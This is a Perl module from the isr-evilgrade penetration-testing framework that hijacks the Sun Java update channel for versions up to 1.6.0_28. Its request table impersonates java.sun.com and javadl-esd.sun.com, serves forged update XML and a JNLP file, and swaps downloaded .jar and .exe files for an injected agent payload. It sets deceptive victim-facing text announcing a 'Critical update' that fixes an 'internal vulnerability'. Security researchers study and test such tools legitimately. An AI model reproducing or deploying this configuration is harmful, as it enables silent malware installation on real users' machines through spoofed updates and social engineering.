###############
# sunjava.pm
#
# Copyright 2011 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::sunjava;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'        => 'Sun Microsystems Java',
    'version'     => '1.0',
    'appver'      => '<= 1.6.0_28',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => '(java.sun.com|javadl-esd.sun.com)',
    'request'     => [
        {   'req' =>
                '(/update/[.\d]+/map\-[.\d]+.xml|/update/1.6.0/map\-m\-1.6.0.xml)'
            ,    #regex friendly
            'type'   => 'file',    #file|string|agent|install
            'method' => '',        #any
            'bin'    => '',
            'string' => '',
            'parse'  => '',
            'file' => './include/sunjava/sunjava_map.xml'
        },

        {   'req'    => '^/java_update.xml$',    #regex friendly
            'type'   => 'file',                  #file|string|agent|install
            'method' => '',                      #any
            'bin'    => '',
            'string' => '',
            'parse'  => '1',
            'file' => './include/sunjava/sunjava_update.xml'
        },

        {   'req'    => '^/java_update_seven.xml$', #regex friendly
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '',
            'string' => '',
            'parse'  => '1',
            'file' => './include/sunjava/sunjava_update_seven.xml'
        },

        {   'req'    => '/x.jnlp',                  #regex friendly
            'type'   => 'file',                     #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '',
            'string' => '',
            'parse'  => '1',
            'file'   => './include/sunjava/x.jnlp'
        },
        {   'req'    => '.jar',                     #regex friendly
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '',
            'file'   => ''
        },

        {   'req'    => '_seven.exe',               #regex friendly
            'type'   => 'file',                     #file|string|agent|install
            'bin'    => 1,
            'method' => '',                         #any
            'string' => '',
            'parse'  => '',
            'file' => './agent/java/javaws_seven.exe'
        },

        {   'req'    => '.exe',                     #regex friendly
            'type'   => 'file',                     #file|string|agent|install
            'bin'    => 1,
            'method' => '',                         #any
            'string' => '',
            'parse'  => '',
            'file'   => './agent/java/javaws.exe'
        },

    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './include/sunjava/JavaPayload/FunnyClass2.jar',
            'desc' => 'Agent to inject'
        },
        'arg' => {
            'val'  => 'http://java.sun.com/x.jnlp"',
            'desc' => 'Arg passed to Agent'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'name' => {
            'val' =>
                "'javaupdate'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1))",
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'title' => {
            'val'  => 'Critical update',
            'desc' => 'Title name displayed in the update'
        },
        'description' => {
            'val'  => 'This critical update fix internal vulnerability',
            'desc' => 'Description to be displayed during the update'
        },
        'atitle' => {
            'val'  => 'Critical vulnerability',
            'desc' => 'Title name to be displayed in the systray item popup'
        },
        'adescription' => {
            'val'  => 'This critical update fix internal vulnerability',
            'desc' => 'Description  to be displayed in the systray item popup'
        },
        'website' => {
            'val'  => 'http://java.com/moreinfolink',
            'desc' => 'Website displayed in the update'
        }
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
